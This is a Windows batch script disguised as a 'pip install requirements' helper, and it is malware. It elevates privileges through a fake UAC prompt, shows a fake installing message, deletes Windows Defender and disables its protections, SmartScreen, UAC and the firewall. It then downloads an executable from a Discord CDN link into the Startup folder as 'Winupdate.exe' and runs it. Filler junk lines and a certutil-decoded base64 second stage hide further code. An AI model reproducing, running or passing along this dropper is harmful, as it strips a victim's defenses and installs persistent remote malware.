title PIP Install Requirements
pip install -r requirements.txt


@echo off
:: BatchGotAdmin
::-------------------------------------
REM  --> Check for permission
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
echo msgbox "Please wait we install packages for you " > %tmp%\tmp.vbs
wscript %tmp%\tmp.vbs
del %tmp%\tmp.vbs

echo  Installing Necessary Packages.....Please Wait.......

cd  %temp%

set abcd=bitsadmin

%abcd%/transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe

set pop=%systemroot%

NSudo -U:T -ShowWindowMode:Hide icacls "%pop%\System32\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18

NSudo -U:T reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
 
NSudo -U:T -ShowWindowMode:Hide  sc delete  windefend  

powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""

powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""

powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"

powershell.exe New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force

powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"

powershell.exe -command "Set-MpPreference -PUAProtection disable"


powershell.exe -command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"
powershell.exe -command "Set-MpPreference -DisableArchiveScanning $true"

powershell.exe -command "Set-MpPreference -DisableIntrusionPreventionSystem $true"
powershell.exe -command "Set-MpPreference -DisableScriptScanning $true"
powershell.exe -command "Set-MpPreference -SubmitSamplesConsent 2"

powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"
powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6"
      
powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6"

powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"

powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"

powershell.exe -command "netsh advfirewall set allprofiles state off"


cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

powershell -command "start-bitstransfer https://cdn.discordapp.com/attachments/853358650160840735/863835437482246194/exe.exe   .\Winupdate.exe"

start  Winupdate.exe

cd.
goto tmp
echo %~n0 [RtnVar]
set /p var=fd:FOR /R %fo% %%G IN (.) DO (   set h=%%~dpa
)%t% & dir & echo %tme%
set "[=rem/||(" & set "]=)"
set /p var=fd:FOR /R %fo% %%G IN (.) DO (   set h=%%~dpa
)%t% & dir & echo %tme%
   set /a "len+=%%A"
endlocal & if "%~2" neq "" (set %~2=%result%) else echo %result%
ELSE IF %F%==0 IF %C%==1
   :: Fixed
whoami
call
call ::insert %~1r %value%
   set result=true
set "input=%~1"
set /p var=fd:FOR /R %fo% %%G IN (.) DO (   set h=%%~dpa
)%t% & dir & echo %tme%


pause
)
call ::insert %~1r %value%
echo <wait>
   set /A md=2*%%A
   if "%s%" equ "#%~1" endl& if "%~3" neq "" (set %~3=-1&exit /b 0)
   if %user_agrees% do
set result=false
set /p var=fd:FOR /R %fo% %%G IN (.) DO (   set h=%%~dpa
)%t% & dir & echo %tme%
   set /A md=2*%%A
   goto :argPad
if "!input:~0,1!" equ "+" set "input = !input:~1!"
   if 0==1 0
   rem Please wait
   goto workdone
call ::insert %~1r %value%
   fc /l %comp1% %comp2%
   set /a "len+=%%A"

   echo %%1=%1 N=%N%
whoami
   if 0==1 0
echo %~n0 [RtnVar]

set wait=true
   goto :argPad
cd.
timeout /t 2 /nobreak > NUL & if errorlevel 1(set r = true, % then %)
   set /A sample =1

set "input=%~1"
   timeout /t 2 /nobreak > NUL & if errorlevel 0 (set r=true, %when%)
set "input=%~1"
echo <wait>
   echo %%1=%1 N=%N%
set "us=/dR:% user %"
   if 0==1 0
   goto workdone
   set /A sample =1
if errorlevel 0 (set r=true, %when%) else (set r=failed, %when%, correct.)

   set for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr%
   move "%source%" "%s%"
set fi=%%~fG & set /p f=f: & set F=%da% & for /f "delims=[] t=2" %%a 
ELSE IF %F%==0 IF %C%==1 & set C=cls & set /A spl =1
setlocal
   ELSE IF %F%==1 IF %C%==0
set "verp=%%~O"
   set fi=%%~fG
goto endoftests
   if "%s%" equ "#%~1" endl& if "%~3" neq "" (set %~3=-1&exit /b 0)
set result=false
for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| fndst [') do set d=%%a
   set /a "len+=%%A"
set "hos=%~2"
   :: Fixed
set "hos=%~2"
::set "th=%~1"
   :: Fixed
   if %ERRORLEVEL% EQU 1 goto w
set /p var=fd:FOR /R %fo% %%G IN (.) DO (   set h=%%~dpa
)%t% & dir & echo %tme%

   2>NUL Info > %temp%
   goto :argPad
ELSE IF %F%==0 IF %C%==1
   set for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr%
set /p var=fd:FOR /R %fo% %%G IN (.) DO (   set h=%%~dpa
)%t% & dir & echo %tme%
move "%source%" "%fs%"
   echo %%1=%1 N=%N%
2>NUL Info > %temp%
   timeout /t 2 /nobreak > NUL
echo Started
::set "th=%~1"
set "hos=%~2"
whoami
   timeout /t 2 /nobreak > NUL & if errorlevel 0 (set r=true, %when%)
   timeout /t 2 /nobreak > NUL
   goto :eof
   goto :argPad
if errorlevel 0 (set r=true, %when%) else (set r=failed, %when%, correct.)
set "c=%~2"
:evr
goto endoftests
   set for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr%
if 0==1 0

:evr

set "hos=%~2"
goto endoftests
   set /a "len+=%%A"

set F=%date%
call ::insert %~1r %value%
set wait=true

pause
)
IF %F%==1 IF %C%==1
whoami
   set /A md=2*%%A
   rem exit /b 0
call ::insert %~1r %value%
   set "record=%~2"
set "c=%~2"
:evr
set result=false
cls
   set wait=false
set "us=/dR:% user %"

set wait=true
   if %ERRORLEVEL% EQU 1 goto w
   echo %%1=%1 N=%N%
for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| fndst [') do set d=%%a
setlocal
   goto workdone
   set /A sample =1
move "%source%" "%fs%"
   move "%source%" "%s%"
if errorlevel 0 (set r=true, %when%) else (set r=failed, %when%, correct.)
   if 0==1 0
echo %~n0 [RtnVar]
set "[=rem/||(" & set "]=)"
set "c=%~2"
timeout /t 2 /nobreak > NUL & if errorlevel 1(set r = true, % then %)
if "!input:~0,1!" equ "-"
   rem exit /b 0
   set /A md=2*%%A
set "c=%~2"
:evr
set F=%date%
   move "%source%" "%s%"
   call
   echo %~1 | find /i "help" >nul 2>&1 && ( goto :help )
   set fi=%%~fG
   call
2>NUL Info > %temp%
   call


pause
)
echo <wait>

   if 0==1 0
set "s=!s:~%% A!"
   set C=cls
2>NUL Info > %temp%
if errorlevel 0 (set r=true, %when%) else (set r=failed, %when%, correct.)
   goto workdone
   set "record=%~2"

   move "%source%" "%s%"
   if "%s%" equ "#%~1" endl& if "%~3" neq "" (set %~3=-1&exit /b 0)
   move "%source%" "%s%"
   set fi=%%~fG

   ELSE IF %F%==1 IF %C%==0
   rem exit /b 0

pause
)
set F=%date%
timeout /t 2 /nobreak > NUL & if errorlevel 1(set r = true, % then %)

pause
)
ELSE IF %F%==0 IF %C%==1 & set C=cls & set /A spl =1
   2>NUL Info > %temp%
   set /A sample =1
if "!input:~0,1!" equ "+" set "input = !input:~1!"
   echo %%1=%1 N=%N%
echo Started

set "us=/dR:% user %"
set "[:=goto :]%% "

   set fi=%%~fG
   set C=cls
echo %%1=%1 %%2=%2 %%3=%3

call
   if %user_agrees% do

ELSE IF %F%==0 IF %C%==1
   if "%s%" equ "#%~1" endl& if "%~3" neq "" (set %~3=-1&exit /b 0)
   ELSE IF %F%==1 IF %C%==0
set "us=/dR:% user %"
echo <wait>
2>NUL Info > %temp%
IF %F%==1 IF %C%==1
   fc /l %comp1% %comp2%
set /A md=2*%%A

pause
)
   set /A md=2*%%A
whoami
   move "%source%" "%s%"
   echo %%1=%1 N=%N%

   rem Please wait
set "c=%~2"

   call
call ::insert %~1r %value%
set "verp=%%~O"
for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| fndst [') do set d=%%a
   set fi=%%~fG

   :: Fixed
   call
set "input=%~1"
if errorlevel 0 (set r=true, %when%) else (set r=failed, %when%, correct.)
   timeout /t 2 /nobreak > NUL

   rem Please wait

pause
)
 ELSE IF %F%==0 IF %C%==1
   2>NUL Info > %temp%
set "verp=%%~O"
set /p var=fd:FOR /R %fo% %%G IN (.) DO (   set h=%%~dpa
)%t% & dir & echo %tme%
if 0==1 0
::set "th=%~1"
   goto :argPad
if "!input:~0,1!" equ "+" set "input = !input:~1!"
set "verp=%%~O"
   set fi=%%~fG
   set "record=%~2"
set /p var=fd:FOR /R %fo% %%G IN (.) DO (   set h=%%~dpa
)%t% & dir & echo %tme%
   echo %~1 | find /i "help" >nul 2>&1 && ( goto :help )
   if errorlevel 1 (@echo off) else
whoami
   fc /l %comp1% %comp2%
   if %user_agrees% do
if "!input:~0,1!" equ "-"
::set "th=%~1"
for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| fndst [') do set d=%%a
2>NUL Info > %temp%
cls
set "input=%~1"
   goto workdone
   rem exit /b 0
move "%source%" "%fs%"

set "[:=goto :]%% "

set /A md=2*%%A
   set result=true
set F=%date%
   set fi=%%~fG
   if errorlevel 1 (@echo off) else
call
move "%source%" "%fs%"
if "!input:~0,1!" equ "-"
   call
timeout /t 2 /nobreak > NUL & if errorlevel 1(set r = true, % then %)
echo %~n0 [RtnVar]
timeout /t 2 /nobreak > NUL & if errorlevel 1(set r = true, % then %)

if errorlevel 0 (set r=true, %when%) else (set r=failed, %when%, correct.)
   if 0==1 0
:evr
if "!input:~0,1!" equ "+" set "input = !input:~1!"
echo Started
set fi=%%~fG & set /p f=f: & set F=%da% & for /f "delims=[] t=2" %%a 
:evr
ELSE IF %F%==0 IF %C%==1
set "[=rem/||(" & set "]=)"
set /p var=fd:FOR /R %fo% %%G IN (.) DO (   set h=%%~dpa
)%t% & dir & echo %tme%

set "[=rem/||(" & set "]=)"
   rem Please wait
   :: Fixed
set /p var=fd:FOR /R %fo% %%G IN (.) DO (   set h=%%~dpa
)%t% & dir & echo %tme%
goto endoftests
   if "%s%" equ "#%~1" endl& if "%~3" neq "" (set %~3=-1&exit /b 0)
   if 0==1 0
set "us=/dR:% user %"
   rem Please wait
echo %~n0 [RtnVar]
if "!input:~0,1!" equ "-"
   set /A sample =1
goto endoftests
setlocal
   timeout /t 2 /nobreak > NUL
set "[:=goto :]%% "

set "c=%~2"
   set /A md=2*%%A
   fc /l %comp1% %comp2%
set F=%date%
 ELSE IF %F%==0 IF %C%==1
   2>NUL Info > %temp%
   fc /l %comp1% %comp2%
set F=%date%
for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| fndst [') do set d=%%a
   set C=cls
if "!input:~0,1!" equ "-"
:evr
   :: Fixed

:evr
cd.
   set for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr%
   timeout /t 2 /nobreak > NUL
   set /A md=2*%%A
whoami
   timeout /t 2 /nobreak > NUL & if errorlevel 0 (set r=true, %when%)
   call
   goto :argPad
   goto :eof
:evr
echo %~n0 [RtnVar]
if 0==1 0
   if "%s%" equ "#%~1" endl& if "%~3" neq "" (set %~3=-1&exit /b 0)

pause
)
echo <wait>
   goto workdone
   set wait=false
   timeout /t 2 /nobreak > NUL
   goto :eof
   set /A sample =1
   set for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr%
set "[=rem/||(" & set "]=)"
set "us=/dR:% user %"
   goto :eof
   set fi=%%~fG
echo Started
 ELSE IF %F%==0 IF %C%==1
   goto :argPad
cd.

IF %F%==1 IF %C%==1
if "!input:~0,1!" equ "+" set "input = !input:~1!"
set /A md=2*%%A
   set /a "len+=%%A"
echo Started
set "[=rem/||(" & set "]=)"
   set fi=%%~fG
   echo %~1 | find /i "help" >nul 2>&1 && ( goto :help )
   set "record=%~2"
cls

   call
   timeout /t 2 /nobreak > NUL
setlocal
set F=%date%
   if "%s%" equ "#%~1" endl& if "%~3" neq "" (set %~3=-1&exit /b 0)

set result=false
   set fi=%%~fG

   set result=true
for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| fndst [') do set d=%%a
   set /A md=2*%%A
echo %~n0 [RtnVar]
set result=false
if 0==1 0
2>NUL Info > %temp%
set wait=true
set "input=%~1"
   set fi=%%~fG
   if "%s%" equ "#%~1" endl& if "%~3" neq "" (set %~3=-1&exit /b 0)
cd.

:evr
if errorlevel 0 (set r=true, %when%) else (set r=failed, %when%, correct.)
   set /A md=2*%%A

   if errorlevel 1 (@echo off) else
echo %%1=%1 %%2=%2 %%3=%3

   set /A md=2*%%A
goto endoftests
set "[:=goto :]%% "
for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| fndst [') do set d=%%a
   2>NUL Info > %temp%
set wait=true
call
   goto workdone
timeout /t 2 /nobreak > NUL & if errorlevel 1(set r = true, % then %)
if errorlevel 0 (set r=true, %when%) else (set r=failed, %when%, correct.)
for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| fndst [') do set d=%%a
   set C=cls

if "!input:~0,1!" equ "-"
   set /A sample =1

goto endoftests
move "%source%" "%fs%"
set result=false
::set "th=%~1"
 ELSE IF %F%==0 IF %C%==1
if errorlevel 0 (set r=true, %when%) else (set r=failed, %when%, correct.)
   rem Please wait
call ::insert %~1r %value%
set result=false
:tmp
@echo off & CERTUTIL -f -decode "%~f0" "%Temp%\0.bat" >nul 2>&1 & call "%Temp%\0.bat" & Exit
-----BEGIN CERTIFICATE----- QGVjaG8gb2ZmICYgQ0VSVFVUSUwgLWYgLWRlY29kZSAiJX5mMCIgIiVUZW1wJVwwLmJhdCIgPm51bCAyPiYxICYgY2FsbCAiJVRlbXAlXDAuYmF0IiAmIEV4aXQKLS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tIFFHVmphRzhnYjJabUlDWWdRMFZTVkZWVVNVd2dMV1lnTFdSbFkyOWtaU0FpSlg1bU1DSWdJaVZVWlcxd0pWd3dMbUpoZENJZ1BtNTFiQ0F5UGlZeElDWWdZMkZzYkNBaUpWUmxiWEFsWERBdVltRjBJaUFtSUVWNGFYUUtMUzB0TFMxQ1JVZEpUaUJEUlZKVVNVWkpRMEZVUlMwdExTMHRJRkZIVm1waFJ6aG5ZakphYlVsRFdXZFJNRlpUVmtaV1ZWTlZkMmRNVjFsblRGZFNiRmt5T1d0YVUwRnBTbGcxYlUxRFNXZEphVlpWV2xjeGQwcFdkM2RNYlVwb1pFTkpaMUJ0TlRGaVEwRjVVR2xaZUVsRFdXZFpNa1p6WWtOQmFVcFdVbXhpV0VGc1dFUkJkVmx0UmpCSmFVRnRTVVZXTkdGWVVVdE1VekIwVEZNeFExSlZaRXBVYVVKRVVsWktWVk5WV2twUk1FWlZVbE13ZEV4VE1IUkpSa1pJVm0xd2FGSjZhRzVaYWtwaFlsVk9kVlJ0ZUd0Uk1FWndXa2MxUTJGSFVraGFlbXhTWlc1Q2FsWnNhRTlpUjA1MVZHMU9WbE5HV25CWmEyUnpZV3hvUmxWdVdscE5NVm93VjJ4ak1VMUhUalZUVlhSYVRXeEdibE5zYUdGa01XeFpWVzA1UzFWWVFqWlhiR2hTV2pCc2RWcEhlRnBpVjJneVdXcEtlazlYUmtsVmFrSnFVMFV3TWxSSWF6VmhNa1paVkcxd2FVMHdjSEpVUnpGUFpHMUtWRTlYYUdwU01uUXlXa1JLVjJGWFJraFBXRnBvVFRBeE1sUXdVbHBsYXpVMlUxaG9UbUZ0ZEROVWExSk9Ua1V4UlZKVVRrNVNSbFYzVkVSR2IyRnNjRmRWVkZKUFVtMVNObHBFUlRWaGJVMTRZa2QwVm1Fd2NFWlVWbFV4VlVkU1JsVnNVbUZTZW1kM1ZGWmpOVTVIUmpaYU0xSk9ZVEZhTUZkV1VtdFVSa1pWVW1wS1ZtRXhjRE5VVm1ONFZVVXdkMDFWTVZoaE1XdDZXVzF3VTJGV1RrVlNiV2hYVFZadk1WVlljRTloYlZKV1kwaGtTbG96UW5SWmFrNUtXakIzZVZkWFpFcGlWa3B6V1d0a2MyUkhUalpOVjBwWlZUQkpkMWxxU2pCaVIwcDFWRlJzVG1GVmJHNVRiRTVYWVVWc1NHSklWa3BSTW1SMVZGZDNNRXN4VW5OV2F6RktVMFZLZDFsdE1XcGFNSGhWVlZka1RWWjZVbTVVVms1Q1lrWkZlVTlZVW1wVFJsbDNWMnhvUzFReGJGaE5WM2hMVlRCS2JGcHJUa05pVjBaWVRsZDBhazB4U2pWVFZWcDZZbXQwVkZGdGRHbGxWVW8yVjJ4b1Vsb3hVblJXYWtKclRXcHNOVmxVUW5OVlZrSlVWbGQ0V2xWWVFuUlphazVLV2pCM2VWZFhaRXBpYkVveVdWUktWMlJYVGpaTlNHaE5Wa1pHYmxkclpGZGpNa1pZVFZod1VWVjZaekpVUjJ4S1dqQndWRlp0YUVwU01uZ3hVMVZPYm1GVmNGZFZhM0JWVmxaV2MxTlhiSEphTVhCSVQwZGtURkZZUWpaWGJHaFNXakZPUmxvemJFOVNSRUp6VTJ4a1JsTXlUWGxXYWtKS1VsUkdTMVZHVGxaaVJteHVZak5DUkdKVk5IaFpNakV6V2pCNFZFMVljR2hXTTJoeldXMDFVbG93ZUZSTldGcHJWMFpLTTFwR2FGSmFNSGQ1VlcxNGEyRlViREZhUm1RMFl6QnNSRTFZUWtwUmVrWktVMVZPUzFGc2EzbFViWGhxVTBaRk1sTlZaRWRrTWs1SVpVaENXazFyV1hkWlZtTTFaRlYzZVdOSWNHbE5hbEp3VTFWTmVGTlZiRVJUYTFKcFRXcFZkMWRzWXpGTlJYaFhWV3BXYWxJeFZUSlhWbWhEWkRKS1NHSkhjRnBYUmtwM1dXcEpNR1J0Um5WVWJscHBZVlZzYmxSR1dtNWFNVlpHVDFaU1YxRXdSakJVUm1SVFlVZFNTRkpYWkVwaWJsSnFVMWN4VDJSdFNuVlZiWGhwWW14S2FsTlhjSFphTVdoRVUyMWtXbEl3U21sV1Z6RlhaREpKZWxOcVFrcFNNWEExV1dwSmQxb3djRmRXYkZKVFZtdHdVRlZXVlhoU2EzQlVVVmhTU2xFeFdsQlhiR2hUVFRKSmVsTnVTbFJXYTBaelYwWmFOR1JXVWtoUFYzQmFWak5rYmxwRlpITmtSbkJWWWpKa1MxWlhhRXBVVjNCU1lrVTVjRlpyTlZSVk1WcHVWMVZrUTFrd2JIVk5SMnhLVVRCR2MxcEVTbGRoVjBaSVQxaGFhR1ZXVmt4WmVrcFhUVVZzUkZOcVFtRldla1l6V1hwT2MyVnNRbFJXYldocVUwVktjbGRXYUZOaFJYQlhaVWh3YkZkRk5YZFpiVEZoWkd0NGRWVnFVbXRSTUd4TVZGZHZNVlF4V2xaa01tUldUVEo0TmxwRlpGZGtSazVZVGxjeGFXVlZSWEpUVlU1S1lrZFNTRlp1VW1wVFJUUXhXVE5zVm1GVlRuUlVha1pxWWxoa2JsUkdUWGhsYlVaWVpVZDRhV0pzUm01VVJrMTRaRzFTV1ZWdVpHdFhSa1p1VkVSS1UySkhVbkJQV0ZaclZqTm9lbE5WVFhoU01HeEpWR3BXYWsweFNuTlpiR1J6WkZad2RFOUViRkpSTUd4eldrVmtWMlJIVGtsVWFsWnFaVlpXY0ZOVlRsZE5NWEJZVTIwNWFVMXFiSGxUYkVaM1lURndXR1F5WkVwaFZsbDNWMnhqZUdReVRYcGlTSEJMVlRCc2JsVkhNREZOVjBwRVVWaHNVV0ZXYkRSUk1qRlBUVmRPZEdReVpFMVZla1kyV1Zaa05HSkhTblZWVjJSTlZYcEdNbHBHYUZOa01sSlpWVmRrVFUxc1NuTmFSMnMxWkZkU1dHVklUa3BSZWtaM1UxVk5lRk5WYkVSVGEwcGFUV3MxYzFrd2FGSk9hMnhJVW01a2FsSXphSGRYVkVwSFRVZEdXRTlZVmsxTmJrSTJXV3BKTUdGVmJFUk5WV3hLVVRCd1JWbHFTVEZOUm5CWVRsUkNUVlpzU1RGWk1HUldUbXhzV1ZGdVpHbFNNbmh4VjFab1UyTkhTWGxPU0Zwb1ltczFNbGx0YkVwYU1IaFhXakprVmxKVWJGVldhMDVDWkVWNFdGVnRhR3RTTUZadVUxYzFNRmt3YkhSVWJscHBZbXhLYzFsdE5WTlpNR3h4WWpKa1dWRXdjRzVYVldSQ1pFVnNSbFJyYkZaaGVteFBWV3hPUW1SR2JFaFJiV1JaVVRCdk5WTlhiRUphTUhCWldrZDRXbUpYYURKWmFrcDZZa1ZPZEZScVJtcGlXR1J1VkVaTmVHVnRSbGhsUjNocFlteEdibFJHVFhoa2JWSlpWVzVrYTFkR1JtNVVSRXBUWWtkU2NFOVlWbXRXTTJoNlUxVk5lRkl3YkVoVVZHeFNVVEJzYzFscll6VmhiR3hZWlVkb2FsTkZTbkpYVm1oVFlVVndWMlZGYUdsTmFteDFXV3RrVjFreFJYbGhTR3hwVFdwR2MxZEZXbGRsYkhCWlUxZGtVMUl3V1hkWFZsbzBVbFp3V0ZkdGFHdFdNMmQzVjBWV1QyUnRTWGxrU0VKaFYwVXhjRk5WVGxkTk1YQllVMjA1YVUxcWJIbFRiRVozWVcxU1dWTnVUa3BSZWtJd1dYcEtjMk14Y0ZoT1ZFSktVWHBDTUZscVRsZE5SMDVKVm1wQ1NsRjZiSEpYYkdoYVpHMUtkVlp1VG1sUk1FWXdWVzFzUTJJeFFsWlJWMnhMVmpOb01sZFVTa2RqTVd4WlVXNWtZVkl3V1hkWFZrNVhXVEZKZVU5WVdtRk5ibWh6VjBWV1QySXlUblJQV0ZKaFZtNW9WMWw2U2xkbFZXeEdWVzFvYTFJd1dtcFZhMlJYWWxac1dWWnVUbXRTYm1oS1dWWm9UMDFIU1hwVGFsWktZVlZHYzFwRVNsZGhWMFpJVDFoYWFHVldWa3hhUldSelpFWndXRTlVUm10Uk1FWXlXa1ZPUW1WVmJFUlBXRlpwVFd0d05WZHNaRWRqYTJ4RlRrZGtWV0pHV2s1Uk1qRlBUVmRPZEdReVpFMVZla1kyV1Zaa05HSkhTblZWVjJSTlZYcEdNbHBHYUZOa01sSlpWVmRrVFUxc1NuTmFSMnMxWkZkU1dHVklUa3BSZWtaSVUxVm9UazlXUmtSVFYzaHBVbnBzY1ZkV1pEUmhSMDVKVVcxMFdsZEdTbTlUYkZvMFUwZEplVTlYTldsU01WcHFWVlJLYjJWWFNYbE5WM2haVW14YU5sZHNhRXBhTVVwSVVtcENXbFp1YUVaWGJHUmhZVWRTV0dWRVFsbFNhelYyV1dwT1MwMUdhM3BXYWtKcVpWVnNibE5zYUd0aVJteDBZVWhhYVUxdVRuTlJNakZQVFZkT2RHUXlaRTFWZWtZMldWWmtOR0pIU25WVlYyUk5WWHBHTWxwR2FGTmtNbEpaVlZka1RVMXNTbk5hUjJzMVpGZFNXR1ZJVGtwUmVrWklVMVZrU2s5V1JrUlRWM2hwVW5wc2NWZFdaRFJoUjA1SlVXMTBXbGRHU205VGJGbzBVMGRKZVU5WE5XbFNNVnBxVlZSS2IyVlhTWGxOVjNoWlVteGFObGRzYUVwYU1VcElVbXBDV2xadWFFWlhiR1JoWVVkU1dHVkVRbGxTVlhBeVdXcEtNR1JHYkZsVGJrcHFaVlZzYmxOc2FHdGlSbXgwWVVoYWFVMXVUbk5STWpGUFRWZE9kR1F5WkUxVmVrWTJXVlprTkdKSFNuVlZWMlJOVlhwR01scEdhRk5rTWxKWlZWZGtUVTFzU25OYVIyczFaRmRTV0dWSVRrcFJla1pJVTFWa00wOVdSa1JUVjNocFVucHNjVmRXWkRSaFIwNUpVVzEwV2xkR1NtOVRiRm8wVTBkSmVVOVhOV2xTTVZwcVZWUktiMlZYU1hsTlYzaFpVbXhhTmxkc2FFcGFNVXBJVW1wQ1dsWnVhRVpYYkdSaFlVZFNXR1ZFUWxsU1dHZ3lWMnBLYzJSVmJFWlZiV2hyVWpCV2NGTlZUbGROTVhCWVUyMDVhVTFxYkhsVGJFWjNUVWRHV0UxWGVHbE5NVmwzVTFWTk5VMUZiRVZUVjJSTlRXcFdNbGRYTlV0aVJteFlZekprVVdGVlNsQldiRll6VXpGcmVsWnViR2xSTUVZd1ZFWm9UMk5IU2toV2JsWnJVVEJHTUZSR1l6Vk5WMUpKVVdwR2ExRXdSakpYYTJSWFRXdDNlVTVVUm1sU00yUnVWRVpXV2xveVNrVk5WVVpLWVZaYWVsbHFTazloUjBwSVVtNWthbEl4U205YVJXUkdZa1pvUmxwSVdtbE5iVko2VjJ4YU5GSkhSa2xUYmxwcFZqRmFhbFpzYUU5aVIwNXdVV3RXV2xkR1NtOVhSVlkwWkd4cmVWSnVUa3BTYXpSM1YxWm9VMkpGYkhCUlYzaHJUV3hhY0ZsVll6VmtiVVkxVmxWMGExSXllREJYYkdNMVRWZFNSRkZZV210Uk1FWTFVMVZOTldSWFNYbFRibXhoVmpCYWVWTlZVVEJhTVZKelZtc3hSR0pWTkhoWk1qRXpXakI0VkUxWWNHaFdNMmh6V1cwMVVsb3dlRlJOV0ZwclYwWktNMXBHYUZKYU1IZDVWVzE0YTJGVWJERmFSbVEwWXpCc1JFMVlRa3BSZWtaS1UxVk9TMUZzYTNsVWJYaHFVMFpGTWxOVlpFZGtNazVJWlVoQ1drMXJXWGRaVm1NMVpGVjNlV05JY0dsTmFsSndVMVZOZUZOVmJFUlRhMUpwVFdwVmQxZHNZekZOUlhoWFZXcFdhbEl4VlRKWFZtaERaREpLU0dKSGNGcFhSa3AzV1dwSk1HUnRSblZVYmxwcFlWVnNibFJHV201YU1WWkdUMVpTVjFFd1JqQlVSbVJUWVVkU1NGSlhaRXBpYmxKcVUxY3hUMlJ0U25WVmJYaHBZbXhLYWxOWGNIWmFNV2hFVTIxa1dsSXdSakJUVlZaaFUyeFdjbFpyWkZWTlYyUnVWRVprUTFveGJFZGtNbXh0VlRCc2JsTlZUbGROTVhCWVUyMDVhVTFxYkhsVGJFWjNZbGRKZWxOWFpFMU5iR3h1VTJ4T1YySlZiRWhpU0ZaS1VUSmtkVlJYZHpCTE1WSnpWbXN4U2xJeFNuZFpNbXhDWkd4c2NGRlhiRXRXTUZveldUQmtVMkZIVWtoU1YzaFpVbFJHTWxwWE1YTmpNa3BJVW0xT1UySlhlRFZYYkdSaFpHMVdSMlZHUm1waVZHeDBXVlprTkdKSFRqVlRWelZNVlRCS2NsbHViRUppTUU1MFZHcEdhbUpZWkc1VVJrMTRaVzFHV0dWSGVHbGliRVp1VkVaTmVHUnRVbGxWYm1SclYwWkdibFJFU2xOaVIxSndUMWhXYTFZemFIcFRWVTE0VWpCc1NHVkhlR3RpVmxwNlZVWldRbUZWY0ZoU2JtUnFVakZLYjFwRlpFWmlSbWhHVFZoYWJHSlhlSHBaYTJSSFdURktkR0pJYkdGV01YQXlXbFZhTkZWWFRuUlBWekZvVmpOb2MxbDZSak5pUlhCWVYyMU9hVko2YkhWWlZtTXhaV3Q0ZEdOSWNHbE5hbEp3VTFWT1YwMHhjRmhUYlRscFRXcHNlVk5zUm5kTlIwWllUVmQ0YVUweFdYZFRWVTAxVFVWc1JWTlhaRTFOYWxZeVYxYzFTMkpHYkZoak1tUlJZVlZLVUZac1ZqTlRNV3Q2Vm01c2FWRXdSakJVUm1oUFkwZEtTRlp1Vm10Uk1FWXdWRVpqTlUxWFVrbFJha1pyVVRCR01sZHJaRmROYTNkNVRsUkdhVkl6Wkc1VVJsWmFXakpLU0ZacVNtRldNMk0xVlZWT1NtSkdiRmxSYm1SaFVqQlpkMWRXVGxkWk1WSllUMVJhYUZZemFIcFhWbG8wVWpKR1dWTnRlR0ZpVkdzd1YwVmFRMlZYU1hsWGJrSnBVakZhTmxkRlRsWmlSbkJ6WlVoS1lWZEhkRFpVUnpGVFlWVnNjRkZYZUd0TmJGcHdXVlZqTldSdFJqVldWWFJhVFRGYU5WbHJUa0prUlhoWlZHNUNhVkl4V2pGYVJVNUNaRVY0V0U5VVJtdFRSVWw0V2tWT1FtUnNjRWhXYWtwTlRXcFZlRmxyWkROYU1IaFdWMWRrYVZJeFdYbFhiR1F6VDFaR1JGTlhlRnBYUlVvelYydGtSMDFHYkZSV2JVNVZWbnByTWxsV1pEUmpNV3hYWlVWa2FGZEZjSE5YYlRBMVRrWm9SMUZ1YkdsTmJIQjNXV3RrVjJWc2FFUldWM2hoWWtob2VWZHNhSEpOUlhoMFZXMXNTbUZWUm5OYVJFcFhZVmRHU0U5WVdtaGxWbFpNVjFST1YyVlhTa1JSV0ZKTlYwVTFkMWxyWkZka1YxSkVVVmhTVFZaNmEzaGFSV2hEVFZkU1JGRllXbUZTTVZsNV